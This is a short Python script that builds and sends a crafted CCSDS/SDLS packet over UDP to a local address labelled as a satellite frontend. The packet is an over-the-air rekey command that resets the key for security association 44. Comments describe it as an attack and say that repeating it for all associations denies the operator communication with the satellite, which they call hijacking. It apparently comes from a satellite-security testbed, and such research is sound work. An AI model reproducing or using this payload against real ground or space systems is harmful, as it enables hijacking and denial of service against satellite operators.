import socket
import numpy as np
import time


def send_to_socket(IP, PORT, command):

	byte_message = bytes(command)

	opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	opened_socket.sendto(byte_message, (IP, PORT))	
	
	return

######

IP = "192.168.100.5"

# for SAT1 (Frontend in)
PORT = 8010

# attack is labeled on TF Header (6th bit of first octet set to 1, Ex. 0x20=00100000 becomes 00100100=0x24)		
																				
#OTAR PDU COMMAND   ---> reset Key for SPI = 44 !!! --> if repeated for all SAs the operator is denied from comm with the satellite (Hijacking) --> see A22. 
command1 = [  												
0x24,0x01,0x10,0x56,0x00, 							# TF header (VCID = part of 3th byte, 0x10 is for VCID = 4)
0xC0,0x00,0x2C,								# SDLS header clear (segment header + 2 bytes), spi is set to 44 (0x2C)
0x18,0x00,0xC0,0x00,0x00,0x46, 						# PDU SPP start (0x18 0x00 needed), length = 71-1=70 bytes -> 0x46 
0x00,0x00,0x00,0x00,								# PUS header 
0x01,0x00,0x40,								# PDU Header for length = 64 bytes 0x00,0x40.
0x00,0x40,																			# Master key ID 
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        												# IV
0xCE,0x26,																			# encrypted key ID(*)
0x4D,0x37,0x11,0x6D,0xBE,0x5A,0x75,0x88,0x79,0xB7,0xFB,0xF3,0x63,0x68,0x5A,0x2D,0xC1,0x7A,0xB2,0x24,0xF3,0x3D,0xEA,0x1A,0x3D,0x35,0xA7,0x9F,0xD2,0x0E,0x0A,0xA6,     # enccrypted key(*)
0xEA,0xA0,0x79,0x1C,0x48,0xE1,0xEF,0x35,0x3D,0xBA,0x05,0x24,0x7B,0x14,0x53,0x2E,   											# MAC(*)
0x00,0x00];  																				# FEC
	
# (*) use cryptolib/test/encryption_css.py for encryption of  key ID + key + MAC !
	
send_to_socket(IP, PORT, command1)
time.sleep(1);

















